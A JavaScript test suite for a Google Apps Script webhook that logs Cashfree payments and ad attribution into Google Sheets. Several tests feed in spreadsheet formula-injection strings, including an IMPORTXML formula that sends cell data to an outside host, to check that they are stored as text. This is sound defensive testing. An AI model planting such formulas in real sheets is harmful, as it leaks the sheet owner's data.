// Runs apps-script/Code.gs in a VM against fake Google services.
import { test, beforeEach } from 'node:test';
import assert from 'node:assert/strict';
import { readFileSync } from 'node:fs';
import vm from 'node:vm';

const code = readFileSync(new URL('../apps-script/Code.gs', import.meta.url), 'utf8');

const TAGS = { lead_id: 'L1', lp_name: 'home', utm_source: 'fb', utm_campaign: 'diwali' };
const LP_FORM = 'am-ads-yearly-basic-plan';
const ORDER = `CFPay_${LP_FORM}_ab12_1`;

const form = (formId = LP_FORM, orderId = ORDER) => ({
  data: {
    form: { form_id: formId, form_url: 'u', form_currency: 'INR' },
    order: {
      order_amount: 7999, order_id: orderId, order_status: 'PAID', transaction_id: 99,
      customer_details: { customer_phone: '9999999999', customer_email: 'a@b.co', customer_name: 'A B', customer_fields: [] },
      amount_details: [],
    },
  },
  event_time: 't',
  type: 'PAYMENT_FORM_ORDER_WEBHOOK',
});
const FORM = form();

const pg = (type, payment_status, order = {}) => ({
  data: {
    order: { order_id: ORDER, order_amount: 7999, order_currency: 'INR', order_tags: TAGS, ...order },
    payment: { cf_payment_id: 99, payment_status, payment_amount: 7999, payment_currency: 'INR', payment_group: 'upi',
      ...(payment_status === 'FAILED' && { error_details: { error_description: 'bank declined' } }) },
    customer_details: { customer_name: 'A B', customer_email: 'a@b.co', customer_phone: '9999999999' },
  },
  event_time: 't',
  type,
});

const sub = (type, subscriptionId) => ({
  data: { subscription_id: subscriptionId, payment_status: 'FAILED', payment_amount: 7999 },
  type,
});

function fakeSheet() {
  const rows = [];
  const cell = (r, c) => (rows[r - 1] && rows[r - 1][c - 1] !== undefined ? rows[r - 1][c - 1] : '');
  const range = (row, col, n = 1, m = 1) => ({
    createTextFinder: (text) => {
      let whole = false;
      const hits = () => {
        const out = [];
        for (let r = row; r < row + n; r++) {
          for (let c = col; c < col + m; c++) {
            const v = String(cell(r, c));
            if (whole ? v === text : v.includes(text)) out.push({ getRow: () => r, getValue: () => cell(r, c) });
          }
        }
        return out;
      };
      const finder = {
        matchEntireCell: (b) => { whole = b; return finder; },
        findNext: () => hits()[0] || null,
        findAll: () => hits(),
      };
      return finder;
    },
    getValues: () => Array.from({ length: n }, (_, i) => Array.from({ length: m }, (_, j) => cell(row + i, col + j))),
    setValues: (vals) => vals.forEach((v, i) => {
      const r = (rows[row - 1 + i] = rows[row - 1 + i] || []);
      v.forEach((x, j) => { r[col - 1 + j] = x; });
    }),
    clearContent: () => { rows.splice(row - 1, n); },
  });
  return {
    rows,
    appendRow: (r) => rows.push([...r]),
    setFrozenRows() {},
    getLastRow: () => rows.length,
    getLastColumn: () => Math.max(0, ...rows.map((r) => r.length)),
    getRange: range,
    getDataRange: () => range(1, 1, rows.length, Math.max(...rows.map((r) => r.length))),
  };
}

let ctx, sheets, lockEvents;
beforeEach(() => {
  sheets = {};
  lockEvents = [];
  ctx = vm.createContext({
    LockService: { getScriptLock: () => ({ waitLock: () => lockEvents.push('wait'), releaseLock: () => lockEvents.push('release') }) },
    PropertiesService: { getScriptProperties: () => ({ getProperty: (k) => ({ SHARED_SECRET: 'shh' })[k] }) },
    SpreadsheetApp: {
      getActiveSpreadsheet: () => ({
        getSheetByName: (n) => sheets[n] || null,
        insertSheet: (n) => (sheets[n] = fakeSheet()),
      }),
    },
    ContentService: {
      MimeType: { JSON: 'json' },
      createTextOutput: (s) => ({ text: s, setMimeType() { return this; } }),
    },
    // IST = UTC+05:30, formatted like Utilities.formatDate(d, 'Asia/Kolkata', 'yyyy-MM-dd HH:mm:ss').
    Utilities: { formatDate: (d) => new Date(d.getTime() + 330 * 60000).toISOString().slice(0, 19).replace('T', ' ') },
    JSON, String, Date, Math,
  });
  vm.runInContext(code, ctx);
});

const post = (obj) => JSON.parse(ctx.doPost({ postData: { contents: JSON.stringify(obj) } }).text);
const hook = (payload = FORM, secret = 'shh') => post({ secret, raw: JSON.stringify(payload), received_at: 'now' });
const payments = () => {
  const [headers, ...rows] = sheets.Payments.rows;
  return rows.map((r) => Object.fromEntries(headers.map((h, i) => [h, r[i]])));
};

test('rejects a wrong secret and writes nothing', () => {
  assert.equal(hook(FORM, 'bad').ok, false);
  assert.deepEqual(Object.keys(sheets), []);
});

test('form webhook for a landing-page form: raw + parsed row, phone as text', () => {
  assert.deepEqual(hook(), { ok: true, stored: 'payment' });
  assert.equal(sheets.Payments_Raw.rows.length, 2); // header + 1
  const [p] = payments();
  assert.equal(p.order_id, ORDER);
  assert.equal(p.status, 'PAID');
  assert.equal(p.phone, "'9999999999");
  assert.equal(p.form_id, LP_FORM);
});

test('all three landing-page forms are kept', () => {
  for (const f of ['am-ads-yearly-basic-plan', 'am-yearly-basic-plan-ga', 'am-yearly-basic-plan-meta']) {
    assert.equal(hook(form(f, `CFPay_${f}_aa_1`)).stored, 'payment', f);
  }
  assert.equal(payments().length, 3);
});

test('other forms on the account are acknowledged but not stored anywhere', () => {
  assert.deepEqual(hook(form('anniversary-yearly-basic', 'CFPay_anniversary-yearly-basic_e3_1')), { ok: true, stored: 'ignored' });
  assert.deepEqual(Object.keys(sheets), []);
});

test('subscription events: ours go to raw only, others are ignored', () => {
  assert.equal(hook(sub('SUBSCRIPTION_PAYMENT_FAILED', `form_132583620_${LP_FORM}`)).stored, 'raw_only');
  assert.equal(hook(sub('SUBSCRIPTION_PAYMENT_SUCCESS', 'form_1_anniversary-monthly-basic')).stored, 'ignored');
  assert.equal(hook(sub('SUBSCRIPTION_PAYMENT_SUCCESS', 'sub_5c69869903c154f5')).stored, 'ignored');
  assert.equal(sheets.Payments_Raw.rows.length, 2);
  assert.equal(sheets.Payments, undefined);
});

test('form webhook with order_tags fills the tag columns', () => {
  const tagged = structuredClone(FORM);
  tagged.data.order.order_tags = TAGS;
  hook(tagged);
  const [p] = payments();
  assert.equal(p.lead_id, 'L1');
  assert.equal(p.lp_name, 'home');
  assert.equal(p.utm_source, 'fb');
  assert.equal(p.gclid, '');
});

test('same delivery twice -> one payment row, two raw rows', () => {
  hook();
  assert.equal(hook().stored, 'duplicate');
  assert.equal(payments().length, 1);
  assert.equal(sheets.Payments_Raw.rows.length, 3);
});

test('PG success after form PAID merges into one row and adds the tags', () => {
  hook();
  assert.equal(hook(pg('PAYMENT_SUCCESS_WEBHOOK', 'SUCCESS')).stored, 'merged');
  const rows = payments();
  assert.equal(rows.length, 1);
  assert.equal(rows[0].event_type, 'PAYMENT_FORM_ORDER_WEBHOOK'); // first writer kept
  assert.equal(rows[0].lead_id, 'L1');
  assert.equal(rows[0].payment_method, 'upi');
});

test('failed and dropped attempts are their own rows, with the error', () => {
  hook(pg('PAYMENT_FAILED_WEBHOOK', 'FAILED'));
  hook(pg('PAYMENT_USER_DROPPED_WEBHOOK', 'USER_DROPPED'));
  hook(pg('PAYMENT_SUCCESS_WEBHOOK', 'SUCCESS'));
  const rows = payments();
  assert.deepEqual(rows.map((r) => r.status), ['FAILED', 'USER_DROPPED', 'PAID']);
  assert.equal(rows[0].error, 'bank declined');
});

test('PG events: app/add-on orders and other forms are ignored', () => {
  const app = pg('PAYMENT_SUCCESS_WEBHOOK', 'SUCCESS', { order_id: 'order_123', order_tags: { addon_product_id: 'x', user_id: 'u' } });
  const otherForm = pg('PAYMENT_SUCCESS_WEBHOOK', 'SUCCESS', { order_id: 'CFPay_anniversary-yearly-basic_e3_1', order_tags: null });
  assert.equal(hook(app).stored, 'ignored');
  assert.equal(hook(otherForm).stored, 'ignored');
  assert.deepEqual(Object.keys(sheets), []);
});

test('PG event for a landing-page form order id without tags is kept', () => {
  assert.equal(hook(pg('PAYMENT_SUCCESS_WEBHOOK', 'SUCCESS', { order_tags: null })).stored, 'payment');
});

test('customer text that looks like a formula is stored as plain text', () => {
  const evil = structuredClone(FORM);
  evil.data.order.customer_details.customer_name = '=IMPORTXML("https://x.co/?"&A1,"//a")';
  evil.data.order.customer_details.customer_email = '+cmd@x.co';
  evil.data.order.customer_details.customer_phone = '+919999999999';
  evil.data.order.order_tags = { lead_id: '=HYPERLINK("x")' };
  hook(evil);
  const [p] = payments();
  assert.equal(p.name, '\'=IMPORTXML("https://x.co/?"&A1,"//a")');
  assert.equal(p.email, "'+cmd@x.co");
  assert.equal(p.phone, "'+919999999999");
  assert.equal(p.lead_id, '\'=HYPERLINK("x")');
});

test('Cashfree test pings and unknown types are ignored', () => {
  assert.equal(hook({ type: 'WEBHOOK', data: { test_object: { test_key: 'test_value' } } }).stored, 'ignored');
  assert.equal(hook({ type: 'PAYMENT_CHARGES_WEBHOOK', data: { order: { order_id: ORDER } } }).stored, 'ignored');
  assert.deepEqual(Object.keys(sheets), []);
});

test('malformed body returns ok:false and still releases the lock', () => {
  const r = JSON.parse(ctx.doPost({ postData: { contents: 'not json' } }).text);
  assert.equal(r.ok, false);
  assert.equal(lockEvents.at(-1), 'release');
});

test('removeOtherForms keeps only landing-page rows in both tabs, re-escaped', () => {
  // Rows as they look before filtering existed, read back the way getValues returns them.
  hook(); // ours
  const raw = sheets.Payments_Raw, pay = sheets.Payments;
  const otherForm = form('anniversary-yearly-basic', 'CFPay_anniversary-yearly-basic_e3_1');
  raw.appendRow(['now', 'k', otherForm.type, JSON.stringify(otherForm)]);
  raw.appendRow(['now', '', 'SUBSCRIPTION_PAYMENT_SUCCESS', JSON.stringify(sub('SUBSCRIPTION_PAYMENT_SUCCESS', 'form_1_anniversary-monthly-basic'))]);
  raw.appendRow(['now', '', 'SUBSCRIPTION_PAYMENT_FAILED', JSON.stringify(sub('SUBSCRIPTION_PAYMENT_FAILED', `form_2_${LP_FORM}`))]);
  const other = [...pay.rows[1]];
  other[3] = 'CFPay_anniversary-yearly-basic_e3_1';
  other[13] = 'anniversary-yearly-basic';
  pay.appendRow(other);
  // getValues hands back text without the escaping apostrophe.
  pay.rows[1][10] = '9999999999';
  pay.rows[1][8] = '=1+1';

  ctx.removeOtherForms();

  assert.deepEqual(raw.rows.slice(1).map((r) => r[2]), ['PAYMENT_FORM_ORDER_WEBHOOK', 'SUBSCRIPTION_PAYMENT_FAILED']);
  const rows = payments();
  assert.equal(rows.length, 1);
  assert.equal(rows[0].form_id, LP_FORM);
  assert.equal(rows[0].phone, "'9999999999");
  assert.equal(rows[0].name, "'=1+1");
});

// --- lp_name + payment details (Phase 1) ---

const subAuth = (status, { txn = 99, subId = '401640257', time = '2026-11-05T17:06:51+05:30', reason = null } = {}) => ({
  data: {
    cf_txn_id: String(txn), cf_subscription_id: subId, subscription_id: `form_132641846_${LP_FORM}`,
    payment_type: 'AUTH', payment_status: status,
    authorization_details: {
      authorization_time: time, authorization_status: status === 'SUCCESS' ? 'ACTIVE' : 'FAILED', payment_group: 'upi',
      payment_method: { upi: { channel: 'link', upi_id: status === 'SUCCESS' ? 'buyer@oksbi' : null } },
    },
    failure_details: { failure_reason: reason },
  },
  event_time: time,
  type: status === 'SUCCESS' ? 'SUBSCRIPTION_PAYMENT_SUCCESS' : 'SUBSCRIPTION_PAYMENT_FAILED',
});

test('lp_name comes from the form id', () => {
  hook(form('am-yearly-basic-plan-ga', 'CFPay_am-yearly-basic-plan-ga_aa_1'));
  hook(form());
  assert.deepEqual(payments().map((r) => r.lp_name), ['ga', 'home']);
});

test('lp_name from order_tags is not overwritten', () => {
  const tagged = structuredClone(FORM);
  tagged.data.order.order_tags = { lp_name: 'custom' };
  hook(tagged);
  assert.equal(payments()[0].lp_name, 'custom');
});

test('auth events before the order (usual order): row gets payment details and failed attempts', () => {
  hook(subAuth('FAILED', { txn: 11, time: '2026-11-05T16:50:00+05:30', reason: 'first fail' }));
  hook(subAuth('FAILED', { txn: 12, time: '2026-11-05T16:55:00+05:30', reason: 'No active account' }));
  hook(subAuth('FAILED', { txn: 13, subId: 'someone-else' }));
  hook(subAuth('SUCCESS', { txn: 99 }));
  hook(); // form order, transaction_id 99
  const [p] = payments();
  assert.equal(p.payment_method, 'upi');
  assert.equal(p.payment_channel, 'link');
  assert.equal(p.upi_id, 'buyer@oksbi');
  assert.equal(p.paid_at, '2026-11-05 17:06:51');
  assert.equal(p.failed_attempts, 2);
  assert.equal(p.last_failure, 'No active account');
  assert.equal(p.cf_subscription_id, '401640257');
});

test('auth success after the order: existing row is enriched', () => {
  hook();
  assert.equal(payments()[0].upi_id, '');
  assert.equal(hook(subAuth('SUCCESS', { txn: 99 })).stored, 'raw_only');
  assert.equal(payments()[0].upi_id, 'buyer@oksbi');
  assert.equal(payments()[0].failed_attempts, 0);
});

test('auth success for an unknown transaction does not create rows', () => {
  hook(subAuth('SUCCESS', { txn: 12345 }));
  assert.equal(sheets.Payments, undefined);
});

test('backfill extends an old header and fills old rows; running twice changes nothing', () => {
  hook(subAuth('SUCCESS', { txn: 99 }));
  hook();
  const pay = sheets.Payments;
  // Simulate a row + header written by the previous version (no new columns, no lp_name).
  const oldWidth = pay.rows[0].indexOf('payment_channel');
  pay.rows[0] = pay.rows[0].slice(0, oldWidth);
  pay.rows[1] = pay.rows[1].slice(0, oldWidth).map((v, i) => (['payment_method', 'lp_name'].includes(pay.rows[0][i]) ? '' : v));
  assert.equal(ctx.backfill(), 1);
  const [p] = payments();
  assert.equal(p.lp_name, 'home');
  assert.equal(p.upi_id, 'buyer@oksbi');
  assert.equal(p.payment_method, 'upi');
  assert.equal(ctx.backfill(), 0);
});

test('a mismatched existing header is refused instead of misplacing data', () => {
  hook();
  sheets.Payments.rows[0][3] = 'something_else';
  const r = hook(form(LP_FORM, `CFPay_${LP_FORM}_zz_2`));
  assert.equal(r.ok, false);
  assert.match(r.error, /Header mismatch/);
});

// --- attribution from the thank-you page (Phase 2) ---

const attribution = (data, secret = 'shh') =>
  post({ secret, kind: 'attribution', received_at: 'now', data: { order_id: ORDER, ...data } });
const AD = {
  thank_you_page: '/thank-you', landing_lp: 'home', landing_url: 'https://super.aifiesta.ai/?utm_source=fb',
  referrer: '', landed_at: '2026-11-06T10:00:00.000Z', utm_source: 'fb', utm_medium: 'Facebook_Mobile_Feed',
  utm_campaign: 'Diwali', utm_content: 'adset 1', ad_id: '120212345678901234', adset_content: 'ad name', fbclid: 'IwAR1',
};

test('attribution needs the shared secret', () => {
  assert.equal(attribution(AD, 'bad').ok, false);
  assert.deepEqual(Object.keys(sheets), []);
});

test('attribution before the webhook: kept in Attribution, copied when the order arrives', () => {
  assert.deepEqual(attribution(AD), { ok: true, stored: 'attribution' });
  hook();
  const [p] = payments();
  assert.equal(p.utm_source, 'fb');
  assert.equal(p.utm_campaign, 'Diwali');
  assert.equal(p.adset_content, 'ad name');
  assert.equal(p.landing_lp, 'home');
  assert.equal(p.fbclid, 'IwAR1');
  assert.equal(p.attribution, 'ad');
  assert.equal(p.ad_id, "'120212345678901234"); // stays text: 18 digits would be rounded as a number
});

test('attribution after the webhook fills the existing row', () => {
  hook();
  attribution(AD);
  assert.equal(payments()[0].utm_campaign, 'Diwali');
});

test('first attribution per order wins', () => {
  attribution(AD);
  assert.equal(attribution({ ...AD, utm_campaign: 'other' }).stored, 'duplicate');
  hook();
  assert.equal(payments()[0].utm_campaign, 'Diwali');
  assert.equal(sheets.Attribution.rows.length, 2);
});

test('attribution labels: organic (landing seen, no ad params) and unknown (nothing stored)', () => {
  attribution({ thank_you_page: '/thank-you', landing_lp: 'home' });
  hook();
  assert.equal(payments()[0].attribution, 'organic');
  const other = `CFPay_${LP_FORM}_cd34_2`;
  post({ secret: 'shh', kind: 'attribution', data: { order_id: other, thank_you_page: '/thank-you' } });
  hook(form(LP_FORM, other));
  assert.equal(payments()[1].attribution, 'unknown');
});

test('attribution for an order id that is not ours is ignored', () => {
  const r = post({ secret: 'shh', kind: 'attribution', data: { order_id: 'CFPay_anniversary-yearly-basic_e3_1', utm_source: 'x' } });
  assert.equal(r.stored, 'ignored');
  assert.equal(sheets.Attribution, undefined);
});

test('attribution text that looks like a formula stays text', () => {
  attribution({ ...AD, utm_campaign: '=IMPORTXML("x")' });
  hook();
  assert.equal(payments()[0].utm_campaign, '\'=IMPORTXML("x")');
});

// --- IST times ---

test('times are written in IST: UTC received_at, +05:30 event_time, paid_at, landed_at', () => {
  post({ secret: 'shh', raw: JSON.stringify(subAuth('SUCCESS', { txn: 99 })), received_at: '2026-11-05T11:36:51.209Z' });
  const f = structuredClone(FORM);
  f.event_time = '2026-11-05T17:06:53+05:30';
  post({ secret: 'shh', raw: JSON.stringify(f), received_at: '2026-11-05T11:36:54.042Z' });
  post({ secret: 'shh', kind: 'attribution', received_at: '2026-11-05T11:37:00.000Z',
    data: { order_id: ORDER, landing_lp: 'home', utm_source: 'fb', landed_at: '2026-11-05T11:30:00.000Z' } });
  const [p] = payments();
  assert.equal(p.received_at, '2026-11-05 17:06:54');
  assert.equal(p.event_time, '2026-11-05 17:06:53');
  assert.equal(p.paid_at, '2026-11-05 17:06:51');
  assert.equal(p.landed_at, '2026-11-05 17:00:00');
  assert.equal(sheets.Payments_Raw.rows[1][0], '2026-11-05 17:06:51');
  assert.equal(sheets.Attribution.rows[1][0], '2026-11-05 17:07:00');
});

test('convertTimesToIst rewrites old ISO cells once and leaves the rest', () => {
  hook();
  attribution({ landing_lp: 'home', landed_at: 'x' });
  const pay = sheets.Payments, H = pay.rows[0];
  pay.rows[1][H.indexOf('received_at')] = '2026-11-05T19:14:55.064Z';
  pay.rows[1][H.indexOf('event_time')] = '2026-11-06T00:44:54+05:30';
  sheets.Payments_Raw.rows[1][0] = '2026-11-05T11:36:54.042Z';
  sheets.Attribution.rows[1][0] = '2026-11-06T03:48:28.642Z';
  assert.equal(ctx.convertTimesToIst(), 4);
  assert.equal(payments()[0].received_at, '2026-11-06 00:44:55');
  assert.equal(payments()[0].event_time, '2026-11-06 00:44:54');
  assert.equal(sheets.Payments_Raw.rows[1][0], '2026-11-05 17:06:54');
  assert.equal(sheets.Attribution.rows[1][0], '2026-11-06 09:18:28');
  assert.equal(payments()[0].order_id, ORDER); // other columns untouched
  assert.equal(ctx.convertTimesToIst(), 0);
});

// --- new "-offer" forms (order ids embed only the first 25 chars of the form id) ---

const NEW_FORMS = [
  ['am-ads-yearly-basic-plan-offer', 'home', 'CFPay_am-ads-yearly-basic-plan-_01ea_1794384828921'],
  ['am-yearly-basic-plan-ga-offer', 'ga', 'CFPay_am-yearly-basic-plan-ga-o_7416_1794384834388'],
  ['am-yearly-basic-plan-meta-offer', 'meta', 'CFPay_am-yearly-basic-plan-meta_f9db_1794384831690'],
];

test('new offer forms are kept, with the right lp_name', () => {
  for (const [f, , id] of NEW_FORMS) assert.equal(hook(form(f, id)).stored, 'payment', f);
  assert.deepEqual(payments().map((r) => [r.form_id, r.lp_name]), NEW_FORMS.map(([f, lp]) => [f, lp]));
});

test('new offer forms: autopay events count as ours', () => {
  assert.equal(hook(sub('SUBSCRIPTION_PAYMENT_FAILED', 'form_132583620_am-ads-yearly-basic-plan-offer')).stored, 'raw_only');
});

test('new offer forms: truncated order ids are recognised (PG events, attribution, lp_name)', () => {
  for (const [, lp, id] of NEW_FORMS) {
    assert.equal(hook(pg('PAYMENT_SUCCESS_WEBHOOK', 'SUCCESS', { order_id: id, order_tags: null })).stored, 'payment', id);
    assert.equal(post({ secret: 'shh', kind: 'attribution', data: { order_id: id, utm_source: 'fb' } }).stored, 'attribution', id);
    assert.equal(ctx.lpName_('', id), lp, id);
  }
});

test('old forms still count after the switch', () => {
  assert.equal(hook(form('am-yearly-basic-plan-ga', 'CFPay_am-yearly-basic-plan-ga_0347_1793879286610')).stored, 'payment');
  assert.equal(payments()[0].lp_name, 'ga');
});

test('Code.gs LP_NAMES and lib/apps-script.js LP_FORM_IDS list the same forms', async () => {
  const { LP_FORM_IDS } = await import('../lib/apps-script.js');
  assert.deepEqual(Object.keys(ctx.LP_NAMES).sort(), [...LP_FORM_IDS].sort());
});
